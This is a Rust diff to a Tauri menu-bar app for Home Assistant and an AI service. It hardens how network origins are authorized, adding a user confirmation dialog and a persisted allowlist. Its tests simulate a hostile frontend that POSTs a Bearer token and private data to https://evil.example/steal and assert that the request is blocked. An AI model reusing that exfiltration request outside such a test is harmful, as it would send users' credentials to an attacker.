@@ -327,19 +327,154 @@ async fn native_http(
 }
 
 #[tauri::command]
-fn set_allowed_origins(origins: Vec<String>) -> Result<(), String> {
-    if origins.len() > 64 {
-        return Err("origin allowlist too long".to_string());
+fn set_allowed_origins(_origins: Vec<String>) -> Result<(), String> {
+    Err("前端不能自行授权网络来源".into())
+}
+
+fn origin_from_endpoint(raw: &str) -> Option<String> {
+    let trimmed = raw.trim();
+    if trimmed.is_empty() {
+        return None;
     }
-    let normalized: HashSet<String> = origins
-        .iter()
-        .map(|origin| normalize_extra_origin(origin).ok_or_else(|| "invalid configured origin".to_string()))
-        .collect::<Result<_, _>>()?;
+    let with_scheme = if trimmed.contains("://") {
+        trimmed.to_string()
+    } else {
+        format!("https://{trimmed}")
+    };
+    let url = reqwest::Url::parse(&with_scheme).ok()?;
+    url_origin(&url)
+}
+
+fn requested_service_origins(assistant_url: &str, ha_url: &str) -> Result<HashSet<String>, String> {
+    let mut origins = HashSet::new();
+    for raw in [assistant_url, ha_url] {
+        if raw.trim().is_empty() {
+            continue;
+        }
+        let origin = origin_from_endpoint(raw)
+            .ok_or_else(|| format!("invalid configured endpoint: {raw}"))?;
+        origins.insert(origin);
+    }
+    Ok(origins)
+}
+
+fn read_origin_store(path: &std::path::Path) -> HashSet<String> {
+    let Ok(text) = std::fs::read_to_string(path) else {
+        return HashSet::new();
+    };
+    let Ok(values) = serde_json::from_str::<Vec<String>>(&text) else {
+        return HashSet::new();
+    };
+    values
+        .into_iter()
+        .filter_map(|value| normalize_extra_origin(&value))
+        .collect()
+}
+
+fn write_origin_store(path: &std::path::Path, origins: &HashSet<String>) -> Result<(), String> {
+    if let Some(parent) = path.parent() {
+        std::fs::create_dir_all(parent).map_err(|error| format!("无法保存已授权来源：{error}"))?;
+    }
+    let mut values: Vec<&String> = origins.iter().collect();
+    values.sort();
+    let body = serde_json::to_string(&values).map_err(|error| error.to_string())?;
+    std::fs::write(path, body).map_err(|error| format!("无法保存已授权来源：{error}"))
+}
+
+#[cfg(test)]
+fn authorization_store_path() -> Option<std::path::PathBuf> {
+    None
+}
+
+#[cfg(not(test))]
+fn authorization_store_path() -> Option<std::path::PathBuf> {
+    let base = std::env::var_os("APPDATA")?;
+    Some(std::path::PathBuf::from(base).join("MenuBarMijia").join("authorized-http-origins.json"))
+}
+
+fn store_authorized(origins: &HashSet<String>) -> Result<(), String> {
+    if let Some(path) = authorization_store_path() {
+        write_origin_store(&path, origins)?;
+    }
     let mut guard = EXTRA_ALLOWED_ORIGINS
         .write()
         .map_err(|_| "origin allowlist unavailable".to_string())?;
-    *guard = normalized;
+    *guard = origins.clone();
     Ok(())
+}
+
+fn decide_service_origins(
+    current: &HashSet<String>,
+    assistant_url: &str,
+    ha_url: &str,
+    confirm: impl Fn(&str) -> bool,
+) -> Result<HashSet<String>, String> {
+    let requested = requested_service_origins(assistant_url, ha_url)?;
+    let mut novel: Vec<String> = requested.difference(current).cloned().collect();
+    novel.sort();
+    for origin in &novel {
+        if !confirm(origin) {
+            return Err(format!("未授权的网络来源：{origin}"));
+        }
+    }
+    Ok(requested)
+}
+
+fn authorize_service_endpoints(
+    assistant_url: &str,
+    ha_url: &str,
+    confirm: impl Fn(&str) -> bool,
+) -> Result<(), String> {
+    let current = allowed_origins_snapshot()?;
+    let next = decide_service_origins(&current, assistant_url, ha_url, confirm)?;
+    store_authorized(&next)
+}
+
+#[cfg(test)]
+fn user_confirms_origin(_origin: &str) -> bool {
+    false
+}
+
+#[cfg(all(windows, not(test)))]
+fn user_confirms_origin(origin: &str) -> bool {
+    use std::ffi::OsStr;
+    use std::os::windows::ffi::OsStrExt;
+    let text = format!(
+        "允许 MenuBarMijia 连接这个地址吗？\n\n{origin}\n\n只有你在设置里填写的 Home Assistant 或 AI 服务地址才应该出现在这里。"
+    );
+    let text_wide: Vec<u16> = OsStr::new(&text).encode_wide().chain(std::iter::once(0)).collect();
+    let title_wide: Vec<u16> = OsStr::new("MenuBarMijia").encode_wide().chain(std::iter::once(0)).collect();
+    #[link(name = "user32")]
+    extern "system" {
+        fn MessageBoxW(
+            hwnd: *mut std::ffi::c_void,
+            text: *const u16,
+            caption: *const u16,
+            utype: u32,
+        ) -> i32;
+    }
+    const MB_YESNO: u32 = 0x0000_0004;
+    const MB_ICONWARNING: u32 = 0x0000_0030;
+    const MB_DEFBUTTON2: u32 = 0x0000_0100;
+    const IDYES: i32 = 6;
+    unsafe {
+        MessageBoxW(
+            std::ptr::null_mut(),
+            text_wide.as_ptr(),
+            title_wide.as_ptr(),
+            MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2,
+        ) == IDYES
+    }
+}
+
+#[cfg(all(not(windows), not(test)))]
+fn user_confirms_origin(_origin: &str) -> bool {
+    false
+}
+
+#[tauri::command]
+fn set_service_endpoints(assistant_url: String, ha_url: String) -> Result<(), String> {
+    authorize_service_endpoints(&assistant_url, &ha_url, user_confirms_origin)
 }
 
 #[tauri::command]
@@ -487,6 +622,7 @@ fn main() {
         .invoke_handler(tauri::generate_handler![
             native_http,
             set_allowed_origins,
+            set_service_endpoints,
             secure_store_get,
             secure_store_set,
             secure_store_delete,
@@ -498,8 +634,12 @@ fn main() {
             open_release_page
         ])
         .setup(move |app| {
+            if let Some(path) = authorization_store_path() {
+                if let Ok(mut guard) = EXTRA_ALLOWED_ORIGINS.write() {
+                    *guard = read_origin_store(&path);
+                }
+            }
             let _ = app.global_shortcut().register(alt_m);
-
             if let Some(main_win) = app.get_webview_window("main") {
                 position_popover(&main_win, None);
                 let win_for_event = main_win.clone();
@@ -555,6 +695,8 @@ fn main() {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+
 
     fn extra(origins: &[&str]) -> HashSet<String> {
         origins
@@ -710,5 +852,141 @@ mod tests {
         assert!(validated_release_url("https://github.com/other/repo/releases").is_err());
         assert!(validated_release_url("https://github.com/jryang1997/MenuBarMijia").is_err());
         assert!(validated_release_url("javascript:alert(1)").is_err());
+    }
+
+    #[test]
+    fn frontend_cannot_grant_an_arbitrary_origin_and_then_request_it() {
+        {
+            let mut guard = EXTRA_ALLOWED_ORIGINS.write().expect("allowlist lock");
+            guard.clear();
+        }
+        let app = tauri::test::mock_builder()
+            .invoke_handler(tauri::generate_handler![native_http, set_allowed_origins, set_service_endpoints])
+            .build(tauri::test::mock_context(tauri::test::noop_assets()))
+            .expect("isolated IPC application");
+        let window = tauri::WebviewWindowBuilder::new(&app, "main", Default::default())
+            .build()
+            .expect("isolated IPC window");
+        let invoke_url: reqwest::Url = "http://tauri.localhost".parse().expect("local app origin");
+        let _grant = tauri::test::get_ipc_response(
+            &window,
+            tauri::webview::InvokeRequest {
+                cmd: "set_allowed_origins".into(),
+                callback: tauri::ipc::CallbackFn(0),
+                error: tauri::ipc::CallbackFn(1),
+                url: invoke_url.clone(),
+                body: tauri::ipc::InvokeBody::Json(serde_json::json!({
+                    "origins": ["https://evil.example"]
+                })),
+                headers: Default::default(),
+                invoke_key: tauri::test::INVOKE_KEY.to_string(),
+            },
+        );
+        let _service = tauri::test::get_ipc_response(
+            &window,
+            tauri::webview::InvokeRequest {
+                cmd: "set_service_endpoints".into(),
+                callback: tauri::ipc::CallbackFn(0),
+                error: tauri::ipc::CallbackFn(1),
+                url: invoke_url.clone(),
+                body: tauri::ipc::InvokeBody::Json(serde_json::json!({
+                    "assistantUrl": "https://evil.example",
+                    "haUrl": ""
+                })),
+                headers: Default::default(),
+                invoke_key: tauri::test::INVOKE_KEY.to_string(),
+            },
+        );
+        let response = tauri::test::get_ipc_response(
+            &window,
+            tauri::webview::InvokeRequest {
+                cmd: "native_http".into(),
+                callback: tauri::ipc::CallbackFn(0),
+                error: tauri::ipc::CallbackFn(1),
+                url: invoke_url,
+                body: tauri::ipc::InvokeBody::Json(serde_json::json!({
+                    "url": "https://evil.example/steal",
+                    "method": "POST",
+                    "headers": {"Authorization": "Bearer isolated-test-value"},
+                    "body": "private-data",
+                    "timeoutMs": 100
+                })),
+                headers: Default::default(),
+                invoke_key: tauri::test::INVOKE_KEY.to_string(),
+            },
+        );
+        EXTRA_ALLOWED_ORIGINS.write().expect("allowlist lock").clear();
+        let error = response.expect_err("a frontend grant must not make native_http reach evil.example");
+        let message = error.as_str().expect("policy error returned to the frontend");
+        assert!(
+            message.contains("拒绝访问未授权来源"),
+            "frontend grant reached transport: {message}"
+        );
+        assert!(message.contains("evil.example"), "unexpected IPC error: {message}");
+    }
+
+    #[test]
+    fn confirmation_authorizes_only_the_configured_service_origins() {
+        let empty = HashSet::new();
+        let granted = decide_service_origins(
+            &empty,
+            "HTTPS://API.DeepSeek.com:8443/v1",
+            "http://[::1]:8123/api",
+            |_| true,
+        )
+        .expect("confirmed endpoints authorize");
+        assert!(check_url_allowed(
+            &reqwest::Url::parse("https://api.deepseek.com:8443/v1/chat/completions").unwrap(),
+            &granted
+        )
+        .is_ok());
+        assert!(check_url_allowed(
+            &reqwest::Url::parse("http://[::1]:8123/api/states").unwrap(),
+            &granted
+        )
+        .is_ok());
+        assert!(check_url_allowed(
+            &reqwest::Url::parse("https://evil.example/steal").unwrap(),
+            &granted
+        )
+        .is_err());
+        assert!(check_url_allowed(
+            &reqwest::Url::parse("http://api.deepseek.com:8443/v1").unwrap(),
+            &granted
+        )
+        .is_err());
+
+        let denied = decide_service_origins(&granted, "https://evil.example", "http://[::1]:8123/api", |_| false);
+        assert!(denied.is_err());
+        assert!(check_url_allowed(
+            &reqwest::Url::parse("https://evil.example/steal").unwrap(),
+            &granted
+        )
+        .is_err());
+
+        let shrunk = decide_service_origins(&granted, "", "http://[::1]:8123/api", |_| false)
+            .expect("dropping an endpoint does not need a new grant");
+        assert!(check_url_allowed(
+            &reqwest::Url::parse("https://api.deepseek.com:8443/v1").unwrap(),
+            &shrunk
+        )
+        .is_err());
+        assert!(check_url_allowed(
+            &reqwest::Url::parse("http://[::1]:8123/api/states").unwrap(),
+            &shrunk
+        )
+        .is_ok());
+    }
+
+    #[test]
+    fn authorized_origin_store_roundtrips_exact_origins() {
+        let dir = std::env::temp_dir().join(format!("menubarmijia-origins-{}", std::process::id()));
+        let path = dir.join("authorized-http-origins.json");
+        let mut origins = HashSet::new();
+        origins.insert("https://api.deepseek.com:8443".to_string());
+        origins.insert("http://[::1]:8123".to_string());
+        write_origin_store(&path, &origins).expect("write store");
+        assert_eq!(read_origin_store(&path), origins);
+        let _ = std::fs::remove_dir_all(dir);
     }
 }
